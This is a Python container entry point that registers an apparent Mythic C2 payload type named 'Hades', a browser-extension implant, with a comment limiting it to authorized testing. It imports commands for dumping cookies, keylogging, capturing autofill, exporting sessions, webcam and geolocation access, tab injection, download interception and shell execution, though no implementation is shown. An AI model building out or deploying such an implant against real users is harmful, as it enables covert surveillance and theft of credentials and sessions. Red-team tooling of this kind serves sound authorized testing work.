#!/usr/bin/env python3
# Hades Mythic Payload Type - Container Entry Point
# For authorized security testing only. Ensure written permission before deployment.

import sys
import os
# Ensure agent_functions package is importable regardless of working directory
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import mythic_container
import mythic_container.mythic_service

# Import payload type and all command definitions so they register themselves
from agent_functions import hades  # noqa: F401 — side-effect import
from agent_functions import (       # noqa: F401
    sleep, screenshot, sysinfo,
    dump_cookies, dump_tabs,
    history, bookmarks,
    keylog, disable_keylog,
    autofill, disable_autofill,
    inject_tab, idle, exit_running, exit_full,
    clipboard, download_history, uptime,
    native_start, native_stop, reload_extension,
    ip_proxy_start, ip_proxy_stop,
    list_extensions, local_storage, find_in_dom,
    network_monitor_start, network_monitor_stop,
    session_export, download_url, screenshot_all,
    geolocation, webcam, notifications, list_pwas, check_permissions,
    download_watch, download_watch_stop,
    download_intercept_start, download_intercept_stop,
    file_ls, file_download, file_upload, file_delete, file_mkdir,
    shell_exec,
)

if __name__ == "__main__":
    mythic_container.mythic_service.start_and_run_forever()
